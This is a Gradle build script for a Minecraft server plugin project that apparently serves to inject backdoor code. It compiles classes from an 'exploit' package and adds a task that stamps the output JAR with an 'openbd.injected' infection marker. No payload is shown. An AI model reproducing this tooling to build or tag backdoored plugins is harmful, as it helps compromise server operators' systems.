import java.util.zip.ZipFile
import java.util.jar.Manifest
import com.tmquan2508.buildtools.InjectClassList

plugins {
    id 'java'
    id("xyz.jpenilla.run-paper") version "2.3.1"
    id("com.gradleup.shadow") version "9.0.0-rc2"
}

group = 'com.tmquan2508'
version = '1.0-SNAPSHOT'

repositories {
    mavenCentral()
    maven {
        name = "spigotmc-repo"
        url = "https://hub.spigotmc.org/nexus/content/repositories/snapshots/"
    }
    maven {
        name = "sonatype"
        url = "https://oss.sonatype.org/content/groups/public/"
    }
}

dependencies {
    compileOnly("org.spigotmc:spigot-api:1.19-R0.1-SNAPSHOT")
    compileOnly("org.apache.logging.log4j:log4j-api:2.17.1")
    compileOnly("org.apache.logging.log4j:log4j-core:2.17.1")
    compileOnly("org.yaml:snakeyaml:2.0")
    compileOnly("org.apache.commons:commons-lang3:3.12.0")
}

def targetJavaVersion = 21
java {
    def javaVersion = JavaVersion.toVersion(targetJavaVersion)
    sourceCompatibility = javaVersion
    targetCompatibility = javaVersion
    if (JavaVersion.current() < javaVersion) {
        toolchain.languageVersion = JavaLanguageVersion.of(targetJavaVersion)
    }
}

tasks.withType(JavaCompile).configureEach {
    options.encoding = 'UTF-8'
    if (targetJavaVersion >= 10 || JavaVersion.current().isJava10Compatible()) {
        options.release.set(targetJavaVersion)
    }
}

processResources {
    def props = [version: version]
    inputs.properties props
    filteringCharset 'UTF-8'
    filesMatching('plugin.yml') {
        expand props
    }
}

tasks.register('injectClassList', InjectClassList) {
    dependsOn tasks.named('classes')
    def classesOutput = sourceSets.main.output.classesDirs.singleFile
    classesDir.set(classesOutput)
    outputClassesDir.set(classesOutput)
    searchPrefix.set("com/tmquan2508/exploit/")
    configClassName.set("com.tmquan2508.exploit.Config")
    placeholder.set("::CLASSLIST::")
}

tasks.named('jar') {
    dependsOn(tasks.named('injectClassList'))
}

tasks {
    runServer {
        minecraftVersion("1.21")
    }
}

tasks.shadowJar {
    dependsOn(tasks.named('injectClassList'))
    archiveClassifier.set('')
}

tasks.register('setInfectionMarkerComment') {
    description = 'Sets a simple infection marker in the standard ZIP comment field.'
    mustRunAfter tasks.named('shadowJar')

    doLast {
        def originalJar = tasks.shadowJar.archiveFile.get().asFile
        if (!originalJar.exists()) {
            println "Shadow JAR not found. Skipping marker comment."
            return
        }

        println "-> Setting infection marker in ZIP comment for ${originalJar.name}"

        def markerComment = 'openbd.injected'

        def tempJar = file("$buildDir/tmp/commented-${originalJar.name}")
        tempJar.parentFile.mkdirs()

        ant.zip(destfile: tempJar, comment: markerComment) {
             zipfileset(src: originalJar)
        }

        originalJar.delete()
        tempJar.renameTo(originalJar)

        println "-> Infection marker successfully set in ZIP comment."
    }
}

build {
    dependsOn shadowJar
    finalizedBy(tasks.named('setInfectionMarkerComment'))
}

artifacts {
    archives shadowJar
}